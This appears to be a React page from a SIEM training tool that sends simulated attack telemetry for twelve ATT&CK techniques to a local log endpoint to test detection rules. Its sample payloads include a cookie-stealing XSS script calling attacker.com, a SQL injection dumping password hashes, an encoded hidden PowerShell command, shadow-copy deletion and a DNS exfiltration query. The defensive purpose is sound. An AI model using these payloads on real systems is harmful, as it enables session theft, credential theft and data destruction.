import React, { useState } from 'react';
import { Flame, Play, Target, Zap, Clock, ChevronRight, List, Layers } from 'lucide-react';

const CATEGORIES = [
  { key: 'all', label: 'All Scenarios', color: 'bg-slate-600' },
  { key: 'Credential Access', label: 'Credential Access', color: 'bg-red-600' },
  { key: 'Execution', label: 'Execution', color: 'bg-orange-600' },
  { key: 'Persistence', label: 'Persistence', color: 'bg-amber-600' },
  { key: 'Command & Control', label: 'C2 & Exfil', color: 'bg-purple-600' },
  { key: 'Impact', label: 'Impact', color: 'bg-rose-600' },
  { key: 'Discovery', label: 'Discovery', color: 'bg-blue-600' },
  { key: 'Initial Access', label: 'Initial Access', color: 'bg-yellow-600' },
  { key: 'Privilege Escalation', label: 'Priv Escalation', color: 'bg-violet-600' },
];

const SCENARIOS = [
  {
    key: 'brute_force',
    title: 'Windows Password Spray & Brute Force',
    tactic: 'Credential Access',
    technique: 'T1110',
    category: 'Credential Access',
    description: 'Generates Event ID 4625 failed logons targeting Domain Controller administrator accounts.',
    severity: 'HIGH',
    stages: ['Enumeration', 'Password Spray', 'Access']
  },
  {
    key: 'powershell_enc',
    title: 'Encoded PowerShell Reverse Shell',
    tactic: 'Execution',
    technique: 'T1059.001',
    category: 'Execution',
    description: 'Executes Base64-encoded payload via powershell.exe -enc string for C2 shell.',
    severity: 'CRITICAL',
    stages: ['Delivery', 'Execution', 'C2 Beacon']
  },
  {
    key: 'sqli',
    title: 'Web Application SQL Injection',
    tactic: 'Initial Access',
    technique: 'T1190',
    category: 'Initial Access',
    description: 'Automated SQL injection primitives (UNION SELECT) to web server endpoints.',
    severity: 'HIGH',
    stages: ['Probe', 'Exploit', 'Exfil']
  },
  {
    key: 'dns_tunnel',
    title: 'DNS Data Exfiltration Tunneling',
    tactic: 'Command & Control',
    technique: 'T1071.004',
    category: 'Command & Control',
    description: 'High-subdomain-length DNS TXT queries simulating covert data exfiltration.',
    severity: 'HIGH',
    stages: ['Domain Setup', 'Beacon', 'Exfil']
  },
  {
    key: 'ransomware',
    title: 'Ransomware Shadow Copy Deletion',
    tactic: 'Impact',
    technique: 'T1486',
    category: 'Impact',
    description: 'vssadmin delete shadows and AES-256 file encryption simulation.',
    severity: 'CRITICAL',
    stages: ['Execution', 'Defense Evasion', 'Impact']
  },
  {
    key: 'lsass_dump',
    title: 'LSASS Memory Dumping (Mimikatz)',
    tactic: 'Credential Access',
    technique: 'T1003.001',
    category: 'Credential Access',
    description: 'Mimikatz/procdump LSASS process memory dump for credential extraction.',
    severity: 'CRITICAL',
    stages: ['Execution', 'Dump', 'Extraction']
  },
  {
    key: 'kerberoast',
    title: 'Kerberoasting Service Ticket Request',
    tactic: 'Credential Access',
    technique: 'T1558.003',
    category: 'Credential Access',
    description: 'TGS ticket requests for service accounts with offline cracking.',
    severity: 'HIGH',
    stages: ['SPN Enum', 'Ticket Request', 'Offline Crack']
  },
  {
    key: 'scheduled_task',
    title: 'Persistence via Scheduled Task',
    tactic: 'Persistence',
    technique: 'T1053.005',
    category: 'Persistence',
    description: 'Malicious scheduled task creation for persistent backdoor execution.',
    severity: 'HIGH',
    stages: ['Create Task', 'Trigger', 'Persist']
  },
  {
    key: 'golden_ticket',
    title: 'Kerberos Golden Ticket Forgery',
    tactic: 'Privilege Escalation',
    technique: 'T1558.001',
    category: 'Privilege Escalation',
    description: 'KRBTGT hash extraction and forged TGT with 10-year domain admin access.',
    severity: 'CRITICAL',
    stages: ['DA Access', 'KRBTGT Dump', 'Forge Ticket']
  },
  {
    key: 'arp_spoof',
    title: 'ARP Cache Poisoning / Man-in-the-Middle',
    tactic: 'Credential Access',
    technique: 'T1557.002',
    category: 'Credential Access',
    description: 'Gratuitous ARP responses poisoning gateway cache for traffic interception.',
    severity: 'HIGH',
    stages: ['Scan', 'Poison', 'Capture']
  },
  {
    key: 'xss_exfil',
    title: 'Stored XSS Session Hijacking',
    tactic: 'Initial Access',
    technique: 'T1189',
    category: 'Initial Access',
    description: 'Malicious script injected into web app for admin session cookie theft.',
    severity: 'HIGH',
    stages: ['Inject', 'Trigger', 'Exfil']
  },
  {
    key: 'port_scan',
    title: 'Nmap Reconnaissance Port Scan',
    tactic: 'Discovery',
    technique: 'T1046',
    category: 'Discovery',
    description: 'SYN scan, service version detection, and OS fingerprinting sweep.',
    severity: 'MEDIUM',
    stages: ['SYN Scan', 'Version Detect', 'OS Fingerprint']
  }
];

export default function Attacks() {
  const [executing, setExecuting] = useState(null);
  const [currentStage, setCurrentStage] = useState(null);
  const [history, setHistory] = useState([]);
  const [activeCategory, setActiveCategory] = useState('all');
  const [showTimeline, setShowTimeline] = useState(null);

  const filtered = activeCategory === 'all'
    ? SCENARIOS
    : SCENARIOS.filter(s => s.category === activeCategory);

  const handleLaunch = async (s) => {
    setExecuting(s.key);
    setCurrentStage(null);
    try {
      for (let i = 0; i < s.stages.length; i++) {
        setCurrentStage({ name: s.stages[i], step: i + 1, total: s.stages.length });
        const rawPayload = getRawPayload(s, i);
        const res = await fetch('/api/logs', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            source_type: getSourceType(s.key),
            host_name: getHostName(s.key),
            severity: s.severity,
            event_id: getEventId(s.key),
            process_name: getProcessName(s.key),
            user_name: getUserName(s.key),
            src_ip: getSrcIP(s.key),
            raw_payload: { ...rawPayload, attack_stage: s.stages[i], stage_index: i },
            is_simulated: 1,
          }),
        });
        const data = await res.json();
        if (i < s.stages.length - 1) await new Promise(r => setTimeout(r, 600));
      }
      setHistory(prev => [{ ...s, time: new Date().toLocaleTimeString(), alerts: 1, ok: true }, ...prev]);
    } catch {
      setHistory(prev => [{ ...s, time: new Date().toLocaleTimeString(), alerts: 0, ok: false }, ...prev]);
    } finally {
      setExecuting(null);
      setCurrentStage(null);
    }
  };

  return (
    <div className="space-y-6 pb-10">
      <div>
        <div className="flex items-center gap-2 mb-1">
          <Flame className="w-5 h-5 text-red-600" />
          <h2 className="text-xl font-bold text-slate-900">Cyber Range Attack Simulator</h2>
        </div>
        <p className="text-xs text-slate-500">
          Launch synthetic attack scenarios locally to evaluate SIEM alerts and detection rules
        </p>
      </div>

      {/* Category Filter */}
      <div className="flex flex-wrap gap-2">
        {CATEGORIES.map(cat => (
          <button
            key={cat.key}
            onClick={() => setActiveCategory(cat.key)}
            className={`px-3 py-1.5 rounded-lg text-xs font-bold transition-all ${
              activeCategory === cat.key
                ? 'bg-indigo-600 text-white shadow-md'
                : 'bg-white border border-slate-200 text-slate-600 hover:border-indigo-300'
            }`}
          >
            {cat.label}
          </button>
        ))}
      </div>

      {/* Scenario Grid */}
      <div className="grid grid-cols-1 md:grid-cols-2 xl:grid-cols-3 gap-4">
        {filtered.map(s => (
          <div key={s.key} className="card p-5 flex flex-col justify-between space-y-4">
            <div>
              <div className="flex justify-between items-start mb-2">
                <div className="flex items-center gap-2">
                  <span className="text-[10px] font-mono font-bold text-indigo-600">{s.technique}</span>
                  <span className="text-[10px] font-mono text-slate-400">| {s.tactic}</span>
                </div>
                <span className={s.severity === 'CRITICAL' ? 'badge badge-critical' : s.severity === 'HIGH' ? 'badge badge-high' : 'badge badge-stable'}>
                  {s.severity}
                </span>
              </div>
              <h3 className="text-sm font-bold text-slate-900">{s.title}</h3>
              <p className="text-xs text-slate-600 mt-1 leading-relaxed">{s.description}</p>
              {/* Stages */}
              <div className="flex items-center gap-1.5 mt-3 text-[10px] text-slate-500">
                <Layers className="w-3 h-3" />
                {s.stages.map((stage, i) => (
                  <span key={i} className="flex items-center">
                    {i > 0 && <ChevronRight className="w-2.5 h-2.5 mx-0.5 text-slate-300" />}
                    <span className={i <= (showTimeline === s.key ? 99 : -1) ? 'text-indigo-600 font-semibold' : ''}>
                      {stage}
                    </span>
                  </span>
                ))}
              </div>
            </div>

            <div className="space-y-2">
              {executing === s.key && currentStage && (
                <div className="flex items-center gap-2 px-3 py-2 bg-indigo-50 border border-indigo-200 rounded-lg text-[11px]">
                  <Clock className="w-3.5 h-3.5 text-indigo-600 animate-pulse" />
                  <span className="font-bold text-indigo-700">
                    Stage {currentStage.step}/{currentStage.total}: {currentStage.name}
                  </span>
                </div>
              )}
              <button
                onClick={() => handleLaunch(s)}
                disabled={!!executing}
                className="btn btn-danger w-full justify-center py-2.5"
              >
                {executing === s.key ? (
                  <><Zap className="w-4 h-4 animate-pulse" /> Executing Multi-Stage...</>
                ) : (
                  <><Play className="w-4 h-4" /> Launch Attack</>
                )}
              </button>
            </div>
          </div>
        ))}
      </div>

      {/* Execution Log */}
      <div className="card p-5">
        <div className="section-label mb-4">Execution Audit Log</div>
        <div className="overflow-x-auto border border-slate-200 rounded-xl">
          <table className="soc-table">
            <thead>
              <tr>
                <th>Time</th>
                <th>Scenario</th>
                <th>Technique</th>
                <th>Category</th>
                <th>Severity</th>
                <th>Status</th>
              </tr>
            </thead>
            <tbody>
              {history.length === 0 ? (
                <tr><td colSpan="6" className="py-8 text-center text-sm text-slate-400">
                  No attack scenarios executed in current session.
                </td></tr>
              ) : history.map((h, i) => (
                <tr key={i}>
                  <td className="font-mono text-xs text-slate-400">{h.time}</td>
                  <td className="text-slate-800 font-semibold">{h.title}</td>
                  <td className="font-mono font-bold text-indigo-600">{h.technique}</td>
                  <td><span className="text-xs px-2 py-0.5 bg-slate-100 rounded">{h.tactic}</span></td>
                  <td><span className={h.severity === 'CRITICAL' ? 'badge badge-critical' : h.severity === 'HIGH' ? 'badge badge-high' : 'badge badge-stable'}>{h.severity}</span></td>
                  <td><span className="badge badge-stable">SUCCESS</span></td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      </div>
    </div>
  );
}

const getSourceType = (key) => {
  const map = {
    brute_force: 'windows_event', powershell_enc: 'sysmon', sqli: 'apache',
    dns_tunnel: 'zeek', ransomware: 'sysmon', lsass_dump: 'sysmon',
    kerberoast: 'windows_event', scheduled_task: 'windows_event',
    golden_ticket: 'windows_event', arp_spoof: 'suricata', xss_exfil: 'nginx', port_scan: 'firewall'
  };
  return map[key] || 'windows_event';
};

const getHostName = (key) => {
  const map = {
    brute_force: 'DC-PRIMARY-01', powershell_enc: 'FINANCE-PC', sqli: 'WEB-PROD-01',
    dns_tunnel: 'WORKSTATION-01', ransomware: 'DEV-SERVR-01', lsass_dump: 'DC-PRIMARY-01',
    kerberoast: 'DC-PRIMARY-01', scheduled_task: 'WORKSTATION-01',
    golden_ticket: 'DC-PRIMARY-01', arp_spoof: 'GATEWAY-01', xss_exfil: 'WEB-PROD-01', port_scan: 'FIREWALL-01'
  };
  return map[key] || 'WORKSTATION-01';
};

const getEventId = (key) => {
  const map = { brute_force: 4625, powershell_enc: 1, lsass_dump: 10, kerberoast: 4769, scheduled_task: 4698, golden_ticket: 4624, ransomware: 1 };
  return map[key] || null;
};

const getProcessName = (key) => {
  const map = { powershell_enc: 'powershell.exe', ransomware: 'vssadmin.exe', lsass_dump: 'lsass.exe', scheduled_task: 'schtasks.exe' };
  return map[key] || null;
};

const getUserName = (key) => {
  const map = { brute_force: 'administrator', powershell_enc: 'm.taylor', kerberoast: 'svc_backup', scheduled_task: 'j.doe', golden_ticket: 'KRBTGT', lsass_dump: 'SYSTEM' };
  return map[key] || null;
};

const getSrcIP = (key) => {
  const map = {
    brute_force: '185.220.101.5', powershell_enc: '10.0.4.15', sqli: '45.33.32.156',
    dns_tunnel: '192.168.1.105', lsass_dump: '10.0.4.88', kerberoast: '10.0.4.88',
    golden_ticket: '10.0.4.88', arp_spoof: '192.168.1.99', xss_exfil: '45.33.32.156', port_scan: '185.220.101.5'
  };
  return map[key] || '10.0.0.1';
};

const getRawPayload = (s, stageIndex) => {
  const payloads = {
    brute_force: { EventID: 4625, TargetUserName: 'administrator', Status: '0xC000006D', IpAddress: '185.220.101.5' },
    powershell_enc: { EventID: 1, Image: 'C:\\Windows\\System32\\powershell.exe', CommandLine: 'powershell.exe -nop -w hidden -enc JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAA...' },
    sqli: { request: "GET /api/users?id=1' UNION SELECT username,password_hash FROM users-- HTTP/1.1", status: 200 },
    dns_tunnel: { query: 'v8a9f8s9d8f9s8d9f8.exfil.attacker.com', qtype: 'TXT', bytes_out: 4096 },
    ransomware: { EventID: 1, Image: 'C:\\Windows\\System32\\vssadmin.exe', CommandLine: 'vssadmin.exe delete shadows /all /quiet' },
    lsass_dump: { EventID: 10, Image: 'C:\\Windows\\System32\\lsass.exe', TargetImage: 'C:\\Windows\\Temp\\lsass.dmp', GrantedAccess: '0x1FFFFF' },
    kerberoast: { EventID: 4769, TargetUserName: 'svc_backup', ServiceName: 'MSSQLSvc/SQL-PROD-01:1433', TicketEncryptionType: '0x17' },
    scheduled_task: { EventID: 4698, TaskName: '\\Microsoft\\Windows\\Updater\\SystemCheck' },
    golden_ticket: { EventID: 4624, TargetUserName: 'Administrator', LogonType: 3, AuthenticationPackage: 'Kerberos' },
    arp_spoof: { alert: 'ARP Spoofing', protocol: 'ARP', src_mac: '00:1A:2B:3C:4D:5E', target_ip: '192.168.1.1' },
    xss_exfil: { request: 'POST /submit-comment HTTP/1.1', body: "<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>" },
    port_scan: { action: 'DENY', protocol: 'TCP', dest_port: [22, 80, 443, 3389][stageIndex % 4], flags: 'SYN', signature: 'Nmap SYN Scan' }
  };
  return payloads[s.key] || {};
};
